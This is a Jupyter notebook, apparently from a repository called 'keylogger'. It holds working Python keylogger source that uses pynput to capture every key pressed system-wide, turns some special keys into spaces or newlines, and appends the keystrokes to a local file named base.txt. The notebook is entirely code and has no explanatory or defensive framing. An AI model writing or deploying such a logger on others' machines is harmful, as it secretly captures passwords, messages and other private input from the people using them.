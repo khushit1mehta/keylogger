{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "9f554b0c",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Listener"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "c3007740",
   "metadata": {},
   "outputs": [],
   "source": [
    "def strokes(key):\n",
    "    letter=str(key)\n",
    "#     print(letter)\n",
    "    letter=letter.replace(\"'\",\"\")\n",
    "    \n",
    "    if letter == 'Key.space':\n",
    "        letter = ' '\n",
    "    if letter == 'Key.shift_r':\n",
    "        letter = ''\n",
    "    if letter == \"Key.ctrl_l\":\n",
    "        letter = \"\"\n",
    "    if letter == \"Key.enter\":\n",
    "        letter = \"\\n\"\n",
    "    if letter == \"Key.backspace\":\n",
    "        letter = ''\n",
    "    if letter == \"Key.ctrl_l\":\n",
    "        letter = ''\n",
    "    if letter == \"Key.tab\":\n",
    "        letter = ''\n",
    "    if letter == \"Key.cmdv\":\n",
    "        letter = ''\n",
    "    if letter == \"Key.caps_lock\":\n",
    "        letter = ''  \n",
    "    if letter == \"Key.left\":\n",
    "        letter = ''\n",
    "    if letter == \"Key.right\":\n",
    "        letter = ''\n",
    "    if letter == \"Key.shift\":\n",
    "        letter = ''\n",
    "        \n",
    "    with open(\"base.txt\",'a') as f4:\n",
    "        f4.write(letter)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "308a71df",
   "metadata": {},
   "outputs": [],
   "source": [
    "with Listener(on_press=strokes) as l:\n",
    "    l.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "260a0b90",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
